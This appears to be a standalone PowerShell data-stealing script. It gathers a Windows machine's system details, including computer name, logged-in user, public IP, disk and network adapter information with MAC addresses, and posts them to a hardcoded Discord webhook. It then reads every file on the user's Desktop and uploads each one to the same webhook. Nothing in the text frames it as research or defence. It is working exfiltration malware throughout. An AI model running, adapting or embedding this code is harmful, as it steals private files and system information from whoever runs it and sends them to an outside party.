# Define the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1328711859490127965/4ml3eBzezc1vNd7ZDEV_T2fw8S2GFAyg3W5zpacjz43MC3l1MA0TZOI57ncd5iCJlIeF"

# Gather system information
$computerName = $env:COMPUTERNAME
$osVersion = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$cpuInfo = (Get-WmiObject -Class Win32_Processor).Name
$memoryGB = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$loggedInUser = (Get-WmiObject -Class Win32_ComputerSystem).UserName
$publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content

# Gather disk information
$diskInfo = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
    @{
        Drive = $_.DeviceID
        TotalSizeGB = [math]::Round($_.Size / 1GB, 2)
        FreeSpaceGB = [math]::Round($_.FreeSpace / 1GB, 2)
    }
}

# Gather network adapter information
$networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | ForEach-Object {
    @{
        Description = $_.Description
        IPAddress = $_.IPAddress -join ", "
        MACAddress = $_.MACAddress
    }
}

# Create the message payload for system information
$payload = @{
    content = "System Information:"
    embeds = @(
        @{
            title = "System Details"
            fields = @(
                @{
                    name = "Computer Name"
                    value = $computerName
                },
                @{
                    name = "OS Version"
                    value = $osVersion
                },
                @{
                    name = "CPU"
                    value = $cpuInfo
                },
                @{
                    name = "Total Memory"
                    value = "$memoryGB GB"
                },
                @{
                    name = "Logged-in User"
                    value = $loggedInUser
                },
                @{
                    name = "Public IP Address"
                    value = $publicIP
                }
            )
        },
        @{
            title = "Disk Information"
            fields = $diskInfo | ForEach-Object {
                @{
                    name = "Drive $($_.Drive)"
                    value = "Total: $($_.TotalSizeGB) GB, Free: $($_.FreeSpaceGB) GB"
                }
            }
        },
        @{
            title = "Network Adapters"
            fields = $networkAdapters | ForEach-Object {
                @{
                    name = $_.Description
                    value = "IP: $($_.IPAddress), MAC: $($_.MACAddress)"
                }
            }
        }
    )
} | ConvertTo-Json -Depth 10

# Send the system information payload to the Discord webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    Write-Host "System information sent successfully!"
} catch {
    Write-Host "Failed to send system information: $_"
}

# Upload files from the Desktop
$desktopPath = [Environment]::GetFolderPath("Desktop")
$files = Get-ChildItem -Path $desktopPath -File

foreach ($file in $files) {
    try {
        # Create a multipart form to upload the file
        $boundary = [System.Guid]::NewGuid().ToString()
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
            "Content-Type: application/octet-stream",
            "",
            [System.IO.File]::ReadAllText($file.FullName),
            "--$boundary--"
        )

        $body = $bodyLines -join "`r`n"

        # Send the file to the Discord webhook
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
        Write-Host "File $($file.Name) uploaded successfully!"
    } catch {
        Write-Host "Failed to upload file $($file.Name): $_"
    }
}
